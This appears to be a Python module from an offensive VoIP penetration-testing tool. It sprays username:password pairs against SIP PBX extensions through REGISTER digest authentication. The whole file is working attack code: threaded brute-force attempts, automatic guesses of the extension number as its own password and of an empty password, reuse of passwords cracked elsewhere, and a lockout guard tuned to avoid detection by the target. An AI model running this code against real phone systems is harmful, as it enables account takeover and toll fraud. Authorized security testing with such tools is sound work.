"""Credential spraying against discovered extensions.

REGISTER-based digest auth. Per-extension lockout guard prevents triggering
PBX account lockout policies that would otherwise burn the engagement.
"""
from __future__ import annotations

import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass

from . import sip
from .utils import RateLimiter, local_ip_for, rand_call_id, rand_tag


@dataclass
class CredHit:
    extension: str
    username: str
    password: str
    success: bool
    evidence: str


def load_credentials(path: str) -> list[tuple[str, str]]:
    """Parse a credentials file. Format: username:password per line."""
    creds: list[tuple[str, str]] = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line:
                u, p = line.split(":", 1)
                creds.append((u, p))
    return creds


def _try_register(
    host: str, ext: str, username: str, password: str,
    port: int = 5060, local_ip: str | None = None,
    timeout: float = 3.0, traffic_log=None,
    source_ip: str = "",
    tcp: bool = False,
    use_tls: bool = False,
) -> tuple[bool, str]:
    """Return (success, evidence). Success = 200 OK after digest auth."""
    if not local_ip:
        local_ip = source_ip if source_ip else local_ip_for(host)
    if use_tls:
        tcp = True
    transport = "TLS" if use_tls else ("TCP" if tcp else "UDP")
    uri = f"sip:{host}"
    call_id = rand_call_id()
    tag = rand_tag()

    # Leg 1: unauth REGISTER → expect 401 with nonce
    msg1 = sip.build_message(
        "REGISTER", uri,
        from_user=ext, to_user=ext,
        host=host, port=port, local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=1, from_tag=tag,
        extra_headers=["Expires: 30"],
        transport=transport,
    )
    if tcp:
        data1 = sip.send_and_recv_tcp(msg1, host, port, timeout=timeout,
                                       use_tls=use_tls, traffic_log=traffic_log)
    else:
        data1 = sip.send_and_recv(msg1, host, port, 0, timeout,
                                   traffic_log=traffic_log)
    if not data1:
        return False, "no response to REGISTER"
    resp1 = sip.parse_response(data1)
    if not resp1:
        return False, "unparseable REGISTER response"
    if resp1.status_code == 200:
        return True, "200 OK on first REGISTER (open registration)"
    if not resp1.is_auth_required:
        return False, f"unexpected {resp1.status_code} {resp1.reason}"

    params = resp1.auth_params
    if not params:
        return False, "no digest params in challenge"

    # Leg 2: authed REGISTER
    hdr_name = "Proxy-Authorization" if resp1.status_code == 407 else "Authorization"
    try:
        auth_header = sip.build_auth_header(
            username, password, "REGISTER", uri, params, header_name=hdr_name,
        )
    except ValueError as exc:
        return False, f"auth skipped: {exc}"

    msg2 = sip.build_message(
        "REGISTER", uri,
        from_user=ext, to_user=ext,
        host=host, port=port, local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=2, from_tag=tag,
        auth_header=auth_header,
        extra_headers=["Expires: 30"],
        transport=transport,
    )
    if tcp:
        data2 = sip.send_and_recv_tcp(msg2, host, port, timeout=timeout,
                                       use_tls=use_tls, traffic_log=traffic_log)
    else:
        data2 = sip.send_and_recv(msg2, host, port, 0, timeout,
                                   traffic_log=traffic_log)
    if not data2:
        return False, "no response to authed REGISTER"
    resp2 = sip.parse_response(data2)
    if not resp2:
        return False, "unparseable authed REGISTER response"
    if resp2.status_code == 200:
        return True, f"200 OK (realm={params.get('realm', '')})"
    return False, f"{resp2.status_code} {resp2.reason}"


def spray(
    host: str,
    extensions: list[str],
    cred_pairs: list[tuple[str, str]],
    port: int = 5060,
    timeout: float = 3.0,
    max_workers: int = 10,
    traffic_log=None,
    stop_on_first: bool = True,
    smart_self_password: bool = True,
    max_failures_per_ext: int = 5,
    ami_cracked_passwords=None,
    source_ip: str = "",
    tcp: bool = False,
    use_tls: bool = False,
) -> list[CredHit]:
    """Spray creds across extensions in parallel.

    smart_self_password: also try (ext, ext) and (ext, "") — extremely common
                          on Grandstream/FreePBX where admins forget to change defaults.
    max_failures_per_ext: stop trying creds against an extension after this
                          many failures, to avoid triggering PBX lockout policies.
                          Set to 0 to disable (not recommended on prod targets).
    """
    local_ip = source_ip if source_ip else local_ip_for(host)
    results: list[CredHit] = []
    results_lock = threading.Lock()
    stop_for_ext: dict[str, threading.Event] = {e: threading.Event() for e in extensions}
    fail_counts: dict[str, int] = {e: 0 for e in extensions}
    fail_lock = threading.Lock()

    def _pairs_for(ext: str) -> list[tuple[str, str]]:
        pairs: list[tuple[str, str]] = []
        if ami_cracked_passwords:
            for p in ami_cracked_passwords:
                if p:
                    pairs.append((ext, p))
        if smart_self_password:
            pairs.append((ext, ext))
            pairs.append((ext, ""))
        for u, p in cred_pairs:
            pairs.append((u, p))
            if u != ext:
                pairs.append((ext, p))
        seen: set[tuple[str, str]] = set()
        deduped: list[tuple[str, str]] = []
        for pair in pairs:
            if pair not in seen:
                seen.add(pair)
                deduped.append(pair)
        return deduped

    def _attempt(ext: str, u: str, p: str) -> CredHit | None:
        if stop_for_ext[ext].is_set():
            return None
        ok, ev = _try_register(host, ext, u, p, port=port, local_ip=local_ip,
                                timeout=timeout, traffic_log=traffic_log,
                                tcp=tcp, use_tls=use_tls)
        if not ok and ("429" in ev or "503" in ev):
            import time as _time
            _time.sleep(2.0)
        return CredHit(ext, u, p, ok, ev)

    # Build the work list
    work: list[tuple[str, str, str]] = []
    for ext in extensions:
        for u, p in _pairs_for(ext):
            work.append((ext, u, p))

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        future_map = {ex.submit(_attempt, e, u, p): (e, u, p)
                      for e, u, p in work}
        for fut in as_completed(future_map):
            ext, _, _ = future_map[fut]
            try:
                hit = fut.result()
            except Exception:
                continue
            if hit is None:
                continue
            with results_lock:
                results.append(hit)
            if hit.success:
                if stop_on_first:
                    stop_for_ext[ext].set()
            else:
                if max_failures_per_ext:
                    with fail_lock:
                        fail_counts[ext] += 1
                        if fail_counts[ext] >= max_failures_per_ext:
                            stop_for_ext[ext].set()

    results.sort(key=lambda r: (r.extension, not r.success))
    return results
